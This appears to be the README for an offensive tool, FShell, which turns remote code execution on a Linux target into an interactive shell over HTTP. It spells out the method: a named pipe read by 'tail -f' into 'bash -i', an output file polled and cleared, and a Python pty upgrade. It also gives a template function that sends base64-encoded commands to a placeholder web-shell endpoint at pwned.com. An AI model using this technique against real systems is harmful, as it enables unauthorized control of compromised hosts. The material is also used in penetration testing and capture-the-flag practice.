
# **FShell**

## What is that
FShell is my own Forward Shell designed to get an interactive tty using remote code execution through a stageless protocol (eg HTTP).


## How it is working
The concepts behind this forward shell are pretty simple.

First you need to create a named pipe on the remote system, it will be used to send command to our tty <br>
```mkfifo /tmp/input```.

Then, create a bash loop that read named pipe content, send it to bash and send the stdin & stderr to output file. <br>
```tail -f /tmp/input | /bin/bash -i > /tmp/output 2>&1 ```

[Reading named pipe] -> [Execute named pipe content] -> [Send stdin/stderr into output file] -> [Go to reading named pipe because of '-f' tail option]

Next part is to start a python thread that performing ```cat /tmp/output``` regularly in order to get output of commands. <br/>
If the thread find output, it will clear file content using ```echo '' > /tmp/output```<br/>
<br>*Tips: In order to avoid error logging of an non-existing file, we execute 'id' command before starting the 'GetOutput' thread to create the output file before reading it.*

One of the last step is to get user input from our python script and sent it in the named pipe using that kind of command: <br>```echo USERCMD > /tmp/input```

**Final trick**
So, using this we get back a remote interactive shell but some command should not work because we have not a 'tty'.
The 'upgrade_shell' command perform a ```python -c 'import pty;pty.spawn("/bin/bash")'``` (and some export and aliases) to spawn a real tty by the current process (used in named pipe loop)


## Requirements
### On attacker machine

Python3 & lib:
- requests
- termcolor

### On the targeted remote system
It is designed to target Linux OS only and require basic commands/tools on the remote system:
- bash
- mkfifo
- cat
- tail
- ps
- grep
- awk
- kill
- python (and pty module)

## Usage
You can change the ```WRITABLE_FOLDER``` variable if /tmp is not available or if you have something better (prefer /dev/shm if available)

You **must** redefine ```execute``` function to perform your remote code execution:

```python3
def execute(cmd, verbose=False, timeout=None)
    """
    :cmd      Raw shell command to execute on the remote system
    :timetout MANDATORY /!\ Used to kill blocking exec loop (used in named pipe creation) in case you can't, put named pipe creation in separated thread
    :verbose  print full cmd execute on the remote system (Debug mode)
    """
    # Put your RCE code here
    r = requests.get('http://pwned.com/rce.php?cmd=%s' % (b64encode(cmd)), timeout=timeout)
    return r.text.strip() # You can apply formating if the output is not only the output of command
```
### Demo

![FShell Demo](https://github.com/Hypnoze57/FShell/blob/master/demo.gif)


# Thanks

Thanks to [@ippsec](https://twitter.com/ippsec), I wasn't knowing that something like this was possible before watching his videos !

Hope you enjoy it!
